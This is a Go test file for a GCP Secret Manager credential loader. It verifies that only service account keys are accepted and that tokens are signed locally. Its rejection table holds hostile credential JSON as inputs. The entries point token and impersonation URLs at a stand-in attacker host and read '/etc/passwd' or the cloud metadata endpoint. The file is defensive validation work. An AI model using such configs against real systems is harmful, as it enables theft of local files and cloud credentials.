package gcpsecretmanager

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"os"
	"path/filepath"
	"strings"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"
)

const (
	testClientEmail = "concourse@my-test-project.iam.gserviceaccount.com"

	// Nothing listens on port 1, so getting a token proves that the token_uri
	// in the key was never contacted.
	unreachableTokenURI = "http://127.0.0.1:1/token"
)

func serviceAccountKeyJSON() string {
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	Expect(err).ToNot(HaveOccurred())
	der, err := x509.MarshalPKCS8PrivateKey(key)
	Expect(err).ToNot(HaveOccurred())

	body, err := json.Marshal(map[string]string{
		"type":           "service_account",
		"project_id":     "my-test-project",
		"private_key_id": "test-key-id",
		"private_key":    string(pem.EncodeToMemory(&pem.Block{Type: "PRIVATE KEY", Bytes: der})),
		"client_email":   testClientEmail,
		"client_id":      "1234567890",
		"token_uri":      unreachableTokenURI,
	})
	Expect(err).ToNot(HaveOccurred())
	return string(body)
}

func writeCredentialsFile(contents string) string {
	path := filepath.Join(GinkgoT().TempDir(), "key.json")
	Expect(os.WriteFile(path, []byte(contents), 0o600)).To(Succeed())
	return path
}

var _ = Describe("Manager credentials", func() {
	var manager *Manager

	BeforeEach(func() {
		manager = &Manager{ProjectID: "my-test-project"}
	})

	It("falls back to Application Default Credentials when none are configured", func() {
		authCreds, err := manager.authCredentials()
		Expect(err).ToNot(HaveOccurred())
		Expect(authCreds).To(BeNil())
	})

	Context("with a service account key", func() {
		var keyJSON string

		BeforeEach(func() {
			keyJSON = serviceAccountKeyJSON()
		})

		expectLocallySignedToken := func() {
			authCreds, err := manager.authCredentials()
			Expect(err).ToNot(HaveOccurred())

			token, err := authCreds.Token(context.Background())
			Expect(err).ToNot(HaveOccurred())

			parts := strings.Split(token.Value, ".")
			Expect(parts).To(HaveLen(3))
			payload, err := base64.RawURLEncoding.DecodeString(parts[1])
			Expect(err).ToNot(HaveOccurred())

			var claims map[string]any
			Expect(json.Unmarshal(payload, &claims)).To(Succeed())
			Expect(claims).To(HaveKeyWithValue("iss", testClientEmail))
			Expect(claims).To(HaveKeyWithValue("scope", "https://www.googleapis.com/auth/cloud-platform"))
		}

		It("loads it from credentials_json and signs tokens locally", func() {
			manager.CredentialsJSON = keyJSON
			expectLocallySignedToken()
		})

		It("loads it from credentials_file and signs tokens locally", func() {
			manager.CredentialsFile = writeCredentialsFile(keyJSON)
			expectLocallySignedToken()
		})
	})

	DescribeTable("rejects anything other than a service account key",
		func(keyJSON string) {
			manager.CredentialsJSON = keyJSON
			_, err := manager.authCredentials()
			Expect(err).To(MatchError(ContainSubstring(`expected type "service_account"`)))

			manager.CredentialsJSON = ""
			manager.CredentialsFile = writeCredentialsFile(keyJSON)
			_, err = manager.authCredentials()
			Expect(err).To(MatchError(ContainSubstring(`expected type "service_account"`)))
		},
		Entry("external account reading a local file",
			`{"type":"external_account","audience":"//iam.googleapis.com/x","subject_token_type":"urn:ietf:params:oauth:token-type:jwt","token_url":"https://attacker.example/token","credential_source":{"file":"/etc/passwd"}}`),
		Entry("external account calling a URL",
			`{"type":"external_account","audience":"//iam.googleapis.com/x","subject_token_type":"urn:ietf:params:oauth:token-type:jwt","token_url":"https://sts.googleapis.com/v1/token","credential_source":{"url":"http://169.254.169.254/latest/meta-data"}}`),
		Entry("authorized user",
			`{"type":"authorized_user","client_id":"x","client_secret":"y","refresh_token":"z"}`),
		Entry("impersonated service account",
			`{"type":"impersonated_service_account","service_account_impersonation_url":"https://attacker.example","source_credentials":{}}`),
		Entry("missing type",
			`{"client_email":"concourse@my-test-project.iam.gserviceaccount.com"}`),
	)

	It("rejects malformed JSON", func() {
		manager.CredentialsJSON = "not json"
		_, err := manager.authCredentials()
		Expect(err).To(MatchError(ContainSubstring("load GCP service account credentials")))
	})

	It("reports a credentials file that cannot be read", func() {
		manager.CredentialsFile = filepath.Join(GinkgoT().TempDir(), "missing.json")
		_, err := manager.authCredentials()
		Expect(err).To(MatchError(ContainSubstring("read GCP credentials file")))
	})
})
